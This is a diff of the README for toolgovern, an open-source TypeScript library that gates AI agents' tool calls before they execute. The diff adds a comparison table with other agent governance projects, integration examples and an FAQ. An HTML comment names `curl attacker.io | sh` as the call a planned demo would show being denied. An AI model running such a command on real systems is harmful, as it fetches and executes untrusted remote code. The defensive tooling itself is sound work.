@@ -3,9 +3,35 @@
 Gate every tool call an AI agent makes -- shell, filesystem, network, credential access -- before
 it executes, not after something already went wrong.
 
+[![CI](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml/badge.svg)](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml)
+[![npm version](https://img.shields.io/npm/v/toolgovern.svg)](https://www.npmjs.com/package/toolgovern)
+[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
+
 ```bash
 npm install toolgovern
 ```
+
+<!-- TODO: no demo GIF/video exists yet. If one gets added, capture: (1) governTool() denying
+     `curl attacker.io | sh` in a terminal with the real DENIED output shown, (2) `toolgovern-cli
+     audit --verify-chain` on the resulting trace file. Target: under 15 seconds, terminal only,
+     no narration needed -- the real output already reads as the demo. Not required: the code
+     block and real CLI output below already show real behavior, not a mockup. -->
+
+### Contents
+
+- [The gap this closes](#the-gap-this-closes)
+- [What it does](#what-it-does)
+- [How it compares to other agent governance projects](#how-it-compares-to-other-agent-governance-projects)
+- [Benchmarks](#benchmarks-measured-not-targets)
+- [Framework integration](#framework-integration)
+- [CLI](#cli)
+- [Self-hosting](#self-hosting)
+- [What's OSS and what isn't](#whats-oss-and-what-isnt)
+- [Security](#security)
+- [Development](#development)
+- [FAQ](#faq)
+- [Community](#community)
+- [License](#license)
 
 ---
 
@@ -111,27 +137,43 @@ posture out of the box. If you want unrecognized calls to require approval or be
 set `defaultDecision: 'require-approval'` or `'deny'` explicitly. Either way, `allow` never means
 "nothing could have gone wrong" -- it means "checked against 31 rules, none fired."
 
-## How it differs from a hosted runtime-control product or a framework's own native hook
+## How it compares to other agent governance projects
 
-Runtime governance for agent tool calls is an active space. There are funded, cross-framework
-products built around the same core idea (evaluate every agent action against policy before it
-runs), sold as a hosted control plane you point your agents at, and some multi-agent frameworks
-are also considering, or have open, unmerged proposals for, a native per-call gating hook of their
-own.
+This isn't an empty field. Read the table honestly before deciding what you need.
 
-toolgovern isn't trying to be a smaller version of a hosted control plane. It's OSS-native and
-embeds directly at your framework's own tool-executor call site through a single wrapping
-function, `governTool()`, in-process, with no network round-trip and no call payload leaving your
-machine unless you build something that sends it somewhere yourself. The classifier and scoping
-rules are plain, readable TypeScript, not a black box behind an API. A framework's own native
-hook, if and when one ships, would only cover that one framework; toolgovern is framework-agnostic
-by design (see `integrations/oma/` for the adapter shape) and ships the scoping-inheritance model
-and the signed local trace alongside the gate itself, not just the allow/deny decision.
+| | **toolgovern** | [Microsoft Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit) | [NVIDIA NeMo Guardrails](https://github.com/NVIDIA-NeMo/Guardrails) | [LangGraph human-in-the-loop](https://docs.langchain.com/oss/python/langchain/human-in-the-loop) |
+| --- | --- | --- | --- |--- |
+| What it actually gates | Tool calls, pre-execution, against a built-in rule set | Tool calls, messages, and delegation, pre-execution, against policy you author (YAML/OPA/Cedar) | LLM input/dialog/retrieval/output, not individual tool-call arguments | A single tool call, paused for a human decision -- no automated risk classification |
+| Rules out of the box | 31, across 5 categories, zero config | None shipped -- you write the policy | Guardrail templates, not a tool-call risk taxonomy | None -- you decide per call |
+| Language / footprint | TypeScript, one library, wraps a function | Python-first, 5 language SDKs, policy engine + identity system + execution sandbox + audit stack | Python | Python (a separate `langgraphjs` exists but tracks independently) |
+| Per-agent scope narrowing | Yes -- a sub-agent can never exceed its coordinator's granted scope | Yes -- documented delegation-chain narrowing and a 4-ring privilege model | No | No |
+| Tamper-evident audit trail | Yes -- signed, hash-chained local JSONL | Yes -- Merkle-audit-backed, part of a formal spec with 157 conformance tests | No (has tracing/telemetry, not cryptographic tamper-evidence) | No |
+| Hosted component required | No, never | No -- self-hosted by design, Azure integration is optional | No | No for the OSS library; LangGraph's own hosted server runtime is separately licensed |
+| Stars (checked 2026-07-12) | 0, pre-launch | 4.8k | 6.7k | 37.1k (core `langgraph` repo) |
+| License | Apache 2.0 | MIT | Apache 2.0 | MIT |
 
-toolgovern is younger and narrower than a mature hosted product. It doesn't have a policy UI, a
-compliance dashboard, or a support contract. If you need governance across five frameworks today
-with a vendor behind it, that's a reasonable thing to go look for. If you want to see and audit
-every rule that can deny a call, and you're fine running it yourself, that's what this is for.
+Two things worth being direct about, because they'd get caught fast otherwise:
+
+Microsoft's Agent Governance Toolkit already does per-agent scope narrowing and a tamper-evident
+audit trail, in a more mature and more thoroughly specified form than toolgovern -- a formal
+delegation-chain spec, a privilege-ring model, 157 conformance tests just for the audit layer.
+Anyone comparing the two on "does it have scoping" or "does it have a signed trail" alone will find
+they're tied. That's not a reason to skip AGT; if you need a full governance platform with identity,
+sandboxing, and compliance mapping behind it, it's a real, well-built option.
+
+NeMo Guardrails and LangGraph's human-in-the-loop middleware are doing a genuinely different job,
+not a weaker version of the same one -- NeMo governs what goes into and out of the model's own
+input/output, and LangGraph's HITL is a manual pause-and-ask primitive with no automated
+classification underneath it. Listing them here is about scope, not a claim that toolgovern beats
+them at their own task.
+
+Where toolgovern's actual edge sits: you `npm install` it, wrap one function, and get 31 rules
+that already exist -- no policy authoring, no identity system to stand up, no separate services to
+run. AGT is infrastructure you deploy; toolgovern is a library you import. If you want a curated
+rule set with zero configuration and you're fine running it yourself with no vendor and no
+dashboard, that's what this is for. If you need a full governance platform with a support contract
+behind it, AGT is the more honest answer today, and pretending otherwise here would not survive
+five minutes of scrutiny.
 
 ## Benchmarks (measured, not targets)
 
@@ -162,12 +204,25 @@ through, and if you find one, extend the corpus yourself.
 
 ## Framework integration
 
-`integrations/oma/` is a generic, documented adapter shape for wrapping a multi-agent framework's
+`integrations/oma/` is a generic, documented adapter for wrapping a multi-agent framework's
 tool-executor call site. It is not a submitted or merged integration against any specific upstream
-project. It models a common `ToolExecutor.runTool(name, args)` pattern several frameworks use, so
-you have a working starting point to adapt rather than writing the wrapper from zero:
+project -- it's a working starting point to adapt, not a claim that any framework ships this today.
+
+Two shapes, matching the two real patterns frameworks actually use. Start with the first one:
 
 ```ts
+// Per-tool, registration-time wrapping -- the pattern most frameworks with a tool registry
+// actually use (register one governed tool at a time).
+import { governedTool } from 'toolgovern-integration-oma';
+import { loadPolicy } from 'toolgovern';
+
+const policy = loadPolicy('./toolgovern.policy.yml');
+registry.register(governedTool(myTool, policy));
+```
+
+```ts
+// Dispatcher wrapping -- for frameworks whose tool-executor is a single
+// runTool(name, args) dispatcher instead of per-tool registration.
 import { governedExecutor } from 'toolgovern-integration-oma';
 import { loadPolicy } from 'toolgovern';
 
@@ -245,6 +300,38 @@ npm audit --audit-level=high
 See `CONTRIBUTING.md` for the repo layout, what a rule change needs (true-positive and
 true-negative test cases, a reason string specific enough to explain a denial without reading the
 source), and how to change the scoping or trace schema without breaking their guarantees.
+
+## FAQ
+
+**Does toolgovern make a tool call safe?**
+No. A gate decision of `allow` means the call was checked against the current 31-rule set and
+nothing fired -- it's a check against a finite, disclosed rule set, not a safety guarantee. See
+`docs/security-model.md` for exactly what the classifier does and doesn't catch.
+
+**Does an unrecognized tool call get blocked by default?**
+No, it's allowed by default. `governTool()`'s `defaultDecision` option defaults to `'allow'`,
+favoring usability out of the box. Set `defaultDecision: 'require-approval'` or `'deny'` if you
+want a fail-closed posture for anything the classifier doesn't recognize.
+
+**Does this send my tool-call data anywhere?**
+No. Everything runs in-process, on your own machine or infrastructure. No call payload, argument,
+trace content, or policy leaves the process unless code you write sends it somewhere -- there's no
+server dependency and nothing to sign up for.
+
+**Does it work with Python or .NET agent frameworks?**
+Not directly -- toolgovern's core is Node/TypeScript-only today, with no Python or .NET runtime or
+bridge. If your framework is Python- or .NET-based, `governTool()` isn't something you can wrap
+your tools in without a bridge that doesn't exist yet.
+
+**Does it detect every risky tool call?**
+No, and the README says so on purpose. The 31 rules are checked honestly against a 112-case corpus
+the maintainers wrote (see Benchmarks below) -- that's a claim about the rules doing what they were
+designed to do, not a claim that every real-world risky call gets caught. A technique outside the
+corpus could still get through.
+
+**Is there a hosted version?**
+No. Everything that exists today is in this repository, Apache 2.0, self-hosted only. See
+[What's OSS and what isn't](#whats-oss-and-what-isnt) for what that does and doesn't include.
 
 ## Community
 
